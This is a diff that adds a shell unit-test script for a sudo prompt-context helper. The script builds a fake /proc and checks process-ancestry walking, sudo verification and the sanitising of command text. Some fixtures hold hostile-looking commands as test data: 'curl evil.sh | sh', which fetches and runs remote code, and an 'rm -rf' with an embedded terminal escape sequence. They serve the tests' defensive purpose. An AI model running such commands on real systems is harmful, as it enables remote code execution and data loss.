@@ -1,0 +1,109 @@
+#!/bin/sh
+# Unit tests for gatherd-prompt-context.
+#
+# Builds a fake /proc so the ancestry walk, the sudo verification and the
+# allowlist are exercised without spawning real privileged processes. The
+# allowlist is the part that must not be discovered to be wrong: it decides
+# what bytes reach a box whose whole job is being trustworthy.
+#
+# Usage: tests/prompt-context
+
+set -eu
+
+TESTSDIR="$(cd "$(dirname "$0")" && pwd)"
+REPO="$(cd "$TESTSDIR/.." && pwd)"
+PASS=0
+FAIL=0
+
+WORK=$(mktemp -d)
+trap 'rm -rf "$WORK"' EXIT
+PATH="$REPO/scripts:$PATH"
+export PATH
+
+ok()  { PASS=$((PASS + 1)); printf 'ok   %s\n' "$1"; }
+bad() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
+
+assert_out() {
+    _d=$1; _want=$2; shift 2
+    _got=$("$@" 2>/dev/null || true)
+    if [ "$_got" = "$_want" ]; then ok "$_d"; else bad "$_d (want [$_want] got [$_got])"; fi
+}
+
+# mkproc <pid> <ppid> <comm> <exe-target> <argv...>
+# Writes a fake /proc/<pid> entry. cmdline is NUL-separated, as the kernel
+# writes it; stat carries ppid in the field after the state letter.
+mkproc() {
+    _pid=$1; _ppid=$2; _comm=$3; _exe=$4; shift 4
+    _d="$WORK/proc/$_pid"
+    mkdir -p "$_d"
+    printf '%s' "$_comm" > "$_d/comm"
+    printf '%s (%s) S %s 0 0 0 0\n' "$_pid" "$_comm" "$_ppid" > "$_d/stat"
+    ln -sf "$_exe" "$_d/exe"
+    : > "$_d/cmdline"
+    for _a in "$@"; do printf '%s\0' "$_a" >> "$_d/cmdline"; done
+}
+
+GATHERD_PROC="$WORK/proc"
+export GATHERD_PROC
+
+# A plain elevation from a shell inside foot: sudo's own argv is the command,
+# and the first non-shell ancestor names the app.
+mkproc 500 400 sudo /usr/bin/sudo sudo -A pacman -Syu
+mkproc 400 300 bash /usr/bin/bash /bin/bash
+mkproc 300 1   foot /usr/bin/foot foot --server
+assert_out 'a verified sudo parent yields both lines' \
+    'elevating: pacman -Syu
+requested by foot' \
+    gatherd-prompt-context 500
+
+# The parent is not sudo, so its argv must not be presented as an elevation.
+mkproc 501 400 evil /usr/bin/evil evil --pretend
+assert_out 'an unverified parent yields no elevating line' \
+    'requested by foot' \
+    gatherd-prompt-context 501
+
+# Shells are skipped, but the walk must stop at the session root rather than
+# running off the end and reporting nothing.
+mkproc 502 400 sudo /usr/bin/sudo sudo -A id
+mkproc 400 301 bash /usr/bin/bash /bin/bash
+mkproc 301 1   sway /usr/bin/sway sway
+assert_out 'the walk stops at sway and still names something' \
+    'elevating: id
+requested by sway' \
+    gatherd-prompt-context 502
+
+# Control bytes must never reach the renderer, and their removal must be
+# announced -- silently dropping them could make a command read as safer.
+mkproc 503 400 sudo /usr/bin/sudo sudo -A "rm$(printf '\033')[2J -rf /tmp/x"
+mkproc 400 300 bash /usr/bin/bash /bin/bash
+assert_out 'elided control bytes are marked' \
+    'elevating: rm[2J -rf /tmp/x [elided]
+requested by foot' \
+    gatherd-prompt-context 503
+
+# Shell metacharacters are NOT elided: a reader needs to see the pipe.
+mkproc 504 400 sudo /usr/bin/sudo sudo -A sh -c 'curl evil.sh | sh'
+assert_out 'shell metacharacters survive the allowlist' \
+    'elevating: sh -c curl evil.sh | sh
+requested by foot' \
+    gatherd-prompt-context 504
+
+# A long command is truncated with an ASCII ellipsis, not a Unicode one.
+mkproc 505 400 sudo /usr/bin/sudo sudo -A pacman -Syu aaaaaaaaaa bbbbbbbbbb cccccccccc dddddddddd eeeeeeeeee
+assert_out 'a long command is truncated to 60 characters plus ...' \
+    'elevating: pacman -Syu aaaaaaaaaa bbbbbbbbbb cccccccccc dddddddddd eeee...
+requested by foot' \
+    gatherd-prompt-context 505
+
+# Nothing knowable at all must still produce a line, so the box never changes
+# shape and absence stays legible.
+assert_out 'an unknown pid says so rather than printing nothing' \
+    'context unavailable' \
+    gatherd-prompt-context 999
+
+assert_out 'a missing argument says so rather than printing nothing' \
+    'context unavailable' \
+    gatherd-prompt-context
+
+printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
+[ "$FAIL" -eq 0 ]
